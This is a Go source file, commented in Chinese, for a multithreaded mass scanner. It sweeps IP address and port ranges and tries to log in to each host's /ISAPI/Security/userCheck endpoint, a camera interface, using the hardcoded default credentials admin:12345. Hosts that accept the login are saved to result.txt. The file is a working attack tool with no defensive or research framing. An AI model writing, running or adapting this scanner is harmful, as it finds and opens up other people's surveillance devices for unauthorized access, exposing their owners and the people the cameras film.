package main

import (
	"fmt"
	"strconv"
	"flag"
	"strings"
	"net"
	"os"
	"net/http"
	"io/ioutil"
//	"reflect"
	"time"
	"runtime"
)
//扫描地址
var ipAddrs chan string = make(chan string)
//扫描结果
var result chan string = make(chan string)
//线程数
var thread chan int = make(chan int)
var nowThread int
var sj string
//关闭程序
var clo chan bool = make(chan bool)
//保存结果
func writeResult(){
	fileName := "result.txt"
	fout,err := os.Create(fileName)
	if err != nil{
		//文件创建失败
		fmt.Println(fileName + " create error")
	}
	defer fout.Close()
	s,ok := <- result
	for ;ok;{
		fout.WriteString(s + "\r\n")
		s,ok = <- result
	}
	//通知进程退出
	clo <- true
}
//根据线程参数启动扫描线程
func runScan(){
	t,ok := <- thread
	nowThread = t
	if ok{
		for i := 0;i < nowThread;i++{
			go scan(strconv.Itoa(i))
		}
	}
	//等待线程终止
	for;<-thread == 0;{
		nowThread--
		if nowThread == 0{
			//全部线程已终止,关闭结果写入,退出程序
			close(result)
			break
		}
	}
}
/**
	扫描线程
*/
var resp *http.Response
var erro error
func scan(threadId string){
	s,ok := <-ipAddrs
	for;ok;{

		sj ="http://admin:12345@" + s + "/ISAPI/Security/userCheck"
		//fmt.Println("[thread-" + threadId + "] scan:" + sj)
		con:=http.Client{Timeout:2*time.Second,}
		resp,erro = con.Get(sj)
		if erro == nil{
			//端口开放
			defer resp.Body.Close()
			body,_ := ioutil.ReadAll(resp.Body)
			str:=string(body[:])
			if strings.Contains(str,"<statusString>OK</statusString>"){
				result <- s
			}

		}
		s,ok = <-ipAddrs
	}
	fmt.Println("[thread-" + threadId + "] end")
	thread <- 0
}

//获取下一个IP
func nextIp(ip string) string{
	ips := strings.Split(ip,".")
	var i int
	for i = len(ips) - 1;i >= 0;i--{
		n,_ := strconv.Atoi(ips[i])
		if n >= 255{
			//进位
			ips[i] = "0"
		}else{
			//+1
			n++
			ips[i] = strconv.Itoa(n)
			break
		}
	}
	if i == -1{
		//全部IP段都进行了进位,说明此IP本身已超出范围
		return ""
	}
	ip = ""
	leng := len(ips)
	for i := 0;i < leng;i++{
		if i == leng -1{
			ip += ips[i]
		}else{
			ip += ips[i] + "."
		}
	}
	return ip
}

//生成IP地址列表
func processIp(startIp,endIp string) []string{
	var ips = make([]string,0)
	for ;startIp != endIp;startIp = nextIp(startIp){
		if startIp != ""{
			ips = append(ips,startIp)
		}
	}
	ips = append(ips,startIp)
	return ips
}

//处理参数
func processFlag(arg []string){
	//开始IP,结束IP
	var startIp,endIp string
	//端口
	var ports []int = make([]int,0)
	index := 0
	startIp = arg[index]
	si := net.ParseIP(startIp)
	if si == nil{
		//开始IP不合法
		fmt.Println("'startIp' Setting error")
		return
	}
	index++
	endIp = arg[index]
	ei := net.ParseIP(endIp)
	if ei == nil {
		//未指定结束IP,即只扫描一个IP
		endIp = startIp
	}else{
		index++
	}
	tmpPort := arg[index]
	if strings.Index(tmpPort,"-") != -1{
		//连续端口
		tmpPorts := strings.Split(tmpPort,"-")
		var startPort,endPort int
		var err error
		startPort,err = strconv.Atoi(tmpPorts[0])
		if err != nil || startPort < 1 || startPort > 65535{
			//开始端口不合法
			return
		}
		if len(tmpPorts) >= 2{
			//指定结束端口
			endPort,err = strconv.Atoi(tmpPorts[1])
			if err != nil || endPort < 1 || endPort > 65535 || endPort < startPort{
				//结束端口不合法
				fmt.Println("'endPort' Setting error")
				return
			}
		}else{
			//未指定结束端口
			endPort = 65535
		}
		for i := 0;startPort + i <= endPort;i++{
			ports = append(ports,startPort + i)
		}
	}else{
		//一个或多个端口
		ps := strings.Split(tmpPort,",")
		for i := 0;i < len(ps);i++{
			p,err := strconv.Atoi(ps[i])
			if err != nil{
				//端口不合法
				fmt.Println("'port' Setting error")
				return
			}
			ports = append(ports,p)
		}
	}
	index++
	t,err := strconv.Atoi(arg[index])
	if err != nil {
		//线程不合法
		fmt.Println("'thread' Setting error")
		return
	}
	//最大线程2048
	if t < 1{
		t = 1
	}else if t > 5000{
		t = 5000
	}

	//传送启动线程数
	thread <- t
	//生成扫描地址列表
	ips := processIp(startIp,endIp)
	il := len(ips)
	for i := 0; i < il;i++{
		pl := len(ports)
		for j := 0;j < pl;j++{
			ipAddrs <- ips[i] + ":" + strconv.Itoa(ports[j])
		}
	}
	close(ipAddrs)
}

func main(){
	flag.Parse()
	if flag.NArg() != 3 && flag.NArg() != 4{
		//参数不合法
		fmt.Println("Parameter error")
		return
	}
	//获取参数
	args := make([]string,0,4)
	for i := 0;i < flag.NArg();i++{
		args = append(args,flag.Arg(i))
	}
	//启动扫描线程
	runtime.GOMAXPROCS(runtime.NumCPU())
	fmt.Printf("以%v个CPU运行",runtime.NumCPU())
	go runScan()
	//启动结果写入线程
	go writeResult()
	//参数处理
	processFlag(args)
	//等待退出指令
	<- clo
	fmt.Println("Exit")
}